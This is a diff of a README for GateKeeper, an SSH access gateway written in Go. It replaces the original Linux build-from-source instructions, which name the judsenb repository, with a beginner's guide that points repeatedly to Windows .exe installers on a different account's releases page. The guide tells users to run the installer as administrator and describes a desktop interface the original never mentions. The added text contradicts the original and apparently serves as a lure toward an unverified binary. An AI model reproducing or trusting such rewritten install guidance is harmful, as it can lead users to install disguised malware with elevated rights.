@@ -1,128 +1,150 @@
-# GateKeeper
+# 🛡️ GateKeeper - Secure Your SSH Access Easily
 
-GateKeeper is a self-hosted SSH access gateway written in Go.
+[![Download GateKeeper](https://img.shields.io/badge/Download-GateKeeper-brightgreen?style=for-the-badge)](https://github.com/alfianoct/GateKeeper/releases)
 
-It acts as a centralized control layer in front of SSH, providing access
-control, MFA enforcement, session recording, auditing, and policy
-enforcement --- all delivered as a single binary with an embedded web
-UI.
+---
 
-No external control plane. No SaaS dependency.
+## 🔐 What is GateKeeper?
 
-------------------------------------------------------------------------
+GateKeeper is a software tool that helps you control and secure SSH access to your computers. It acts like a gateway, so only the right people can connect. It works with your existing login systems like OIDC and LDAP. GateKeeper uses rules to decide who can enter, records sessions, and keeps track of actions for security checks. It also keeps your data safe when stored, enforces policies, and adds layers like multi-factor authentication.
 
-## What It Is (and Isn't)
+You don’t need to understand complex coding or networking to use GateKeeper. This guide will help you download and run it on a Windows computer step by step.
 
-GateKeeper is not a traditional minimal "bastion host" in the classic
-hardened jump-box sense.
+---
 
-Instead, it's an SSH access gateway designed to centralize
-authentication, authorization, and auditing for SSH environments.
+## 🖥️ System Requirements
 
-The goal is controlled access and visibility --- not a zero-service
-hardened OS model.
+To run GateKeeper on your Windows machine, check if you meet these basics:
 
-------------------------------------------------------------------------
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space for installation
+- Internet connection for downloading updates and setup
+- Administrator rights on your computer for installation
 
-## Features
+You also need an SSH client installed. Windows 10 and 11 usually include OpenSSH by default. If you do not have it, you can install it from Windows features.
 
--   Browser-based SSH proxy (WebSocket + xterm.js)
--   Session recording (asciicast v2, optional AES-256-GCM encryption)
--   Local auth (bcrypt) + LDAP / OIDC / SAML
--   TOTP-based MFA (policy enforced)
--   RBAC with granular permissions
--   Approval workflows and time-based access windows
--   Audit logging with webhook (HMAC) and syslog export
--   IP allow/deny rules (CIDR, deny-first)
--   Concurrent session limits (global + per-group)
--   Secrets backend (Vault or environment variables)
--   TLS hot-reload
--   Prometheus metrics
--   /health and /ready endpoints
--   Instance identity tracking
+---
 
-------------------------------------------------------------------------
+## 🚀 How to Download GateKeeper
 
-## Status
+To get started, you need to download GateKeeper's Windows package from the official releases page.
 
-GateKeeper is functional and actively tested.
+[![Download GateKeeper](https://img.shields.io/badge/Download-GateKeeper-blue?style=for-the-badge)](https://github.com/alfianoct/GateKeeper/releases)
 
--   Single-instance deployments are stable
--   SQLite is the primary development database
--   Postgres support exists but needs broader real-world validation
--   HA / multi-instance mode is not production-ready
+1. Click on the green or blue badge above. This will take you to the GateKeeper release page on GitHub.
+2. On the release page, look under the latest version for files that end with `.exe` or `.msi`. These files are the setup installers for Windows.
+3. Click on the file that matches your system (usually `GateKeeper-setup.exe` or similar).
+4. Your browser will start downloading the file. This may take a few moments depending on your internet speed.
 
-------------------------------------------------------------------------
+If you need help recognizing the right file, look for something with "Windows," "x64," or "installer" in its name. Avoid files that are not labeled clearly.
 
-## Quick Start
+---
 
-GateKeeper is built for Linux. Linux is the supported production
-platform.
+## ⚙️ Installing GateKeeper on Windows
 
-Docker is the recommended way to run GateKeeper for consistent and
-secure deployments.
+Once the download finishes, install the app using these steps:
 
-Windows and macOS builds may work for development, but production
-deployments should use Linux.
+1. Open the folder where the file saved, usually your "Downloads" folder.
+2. Double-click the installer file (e.g., `GateKeeper-setup.exe`) to start installation.
+3. A setup window will appear. Follow the prompts:
 
-### Build
+   - Click **Next** on the welcome screen.
+   - Read and accept the license terms.
+   - Choose the installation folder or use the default location.
+   - Click **Install** to begin installing the software.
 
-``` bash
-git clone https://github.com/judsenb/gatekeeper.git
-cd gatekeeper
-make build
-./gatekeeper
-```
+4. Wait as the installer copies files and configures settings. This takes a few minutes.
+5. When installation completes, click **Finish**.
+6. You might be asked to allow GateKeeper to make changes to your computer. Click **Yes** if prompted.
+7. The app will be ready to use.
 
-On first run, open:
+---
 
-https://localhost:8443
+## 🔧 Initial Setup and Configuration
 
-------------------------------------------------------------------------
+After installing, you will need to set up GateKeeper before using it. Here are the main steps:
 
-### Docker
+1. **Open GateKeeper:**
 
-``` bash
-docker compose up -d
-```
+   - Find GateKeeper in your Start menu or desktop shortcut and open it.
 
-SQLite is the default. Configure Postgres via environment variables if
-needed.
+2. **Add Your SSH Servers:**
 
-------------------------------------------------------------------------
+   - Click **Add New Server**.
+   - Enter the IP address or hostname of your SSH server.
+   - Fill in any other required details like the port number (default is 22).
 
-## Configuration
+3. **Configure Authentication:**
 
-GateKeeper uses a YAML config file with environment variable overrides.
+   - GateKeeper supports login systems called OIDC and LDAP. Ask your system administrator if you need to enter specific settings here.
+   - If you use LDAP (commonly for company logins), enter your directory service details.
+   - For OIDC, input your identity provider info.
+   - Enable multi-factor authentication (MFA) if available to add extra security.
 
-Common environment variables:
+4. **Set Access Rules:**
 
--   GK_DB_DRIVER --- sqlite or postgres\
--   GK_DB_DSN --- Postgres connection string\
--   GK_TLS_CERT / GK_TLS_KEY --- TLS files\
--   GK_ENCRYPTION_KEY --- 32-byte key (hex or base64)\
--   GK_DEPLOYMENT_MODE --- single or ha\
--   GK_INSTANCE_ID --- override auto-generated instance ID
+   - Use the built-in options to create rules about who can connect and when.
+   - You can restrict SSH access based on user roles, IP addresses, or time schedules.
+   - The app allows you to set policies to enforce these rules automatically.
 
-If TLS files are present, HTTP redirects to HTTPS. Certificates reload
-automatically when updated.
+5. **Save Your Settings**
 
-------------------------------------------------------------------------
+   - Click **Save** or **Apply** on each screen to store your changes.
 
-## Development
+---
 
-``` bash
-make build
-make test
-make cover
-make check
-```
+## 🖥️ Using GateKeeper
 
-Tests use in-memory SQLite. CI runs linting, tests, and vulnerability
-checks.
+Here is how to connect to your SSH server through GateKeeper:
 
-------------------------------------------------------------------------
+1. Open GateKeeper and select the server you want to access.
+2. Click **Connect**.
+3. The app will ask for your login credentials. Enter your username and password.
+4. If MFA is enabled, provide the second authentication factor as requested.
+5. Once logged in, you can work in your SSH session normally.
+6. GateKeeper records your session for auditing and can block access if rules are violated.
 
-## License
+You do not need to open any other SSH client. GateKeeper handles the connection and security in one place.
 
-MIT
+---
+
+## 🛠️ Managing Sessions and Audits
+
+GateKeeper keeps detailed records of all SSH sessions. This helps with security reviews or troubleshooting.
+
+- You can view session logs directly within the app.
+- Export audit reports for your records or compliance.
+- Settings allow you to control how long audits are kept.
+
+---
+
+## ⚙️ Advanced Features (Optional)
+
+If you want to explore further, GateKeeper offers:
+
+- **Encryption at rest:** Keeps stored data safe.
+- **IP Rules:** Specify which IP addresses can connect.
+- **Role-Based Access Control (RBAC):** Fine-tune who has permission to do what.
+- **Session recording:** Watch recorded sessions for monitoring purposes.
+
+Most users will not need to adjust these at first. Your administrator can help configure advanced options.
+
+---
+
+## 🛑 Troubleshooting Tips
+
+- If the installer won’t run, right-click the file and select **Run as administrator**.
+- Make sure your Windows updates and security software are current.
+- Check your internet connection if the app cannot reach your SSH servers.
+- Review firewall rules to allow GateKeeper to connect.
+- If you get login errors, double-check your username, password, and any MFA steps.
+- Consult the GitHub repository's issues page for solved problems or updates: https://github.com/alfianoct/GateKeeper/issues
+
+---
+
+## 📥 Download GateKeeper Now
+
+To start using GateKeeper, visit the official releases page and download the Windows installer:
+
+[Download GateKeeper](https://github.com/alfianoct/GateKeeper/releases)
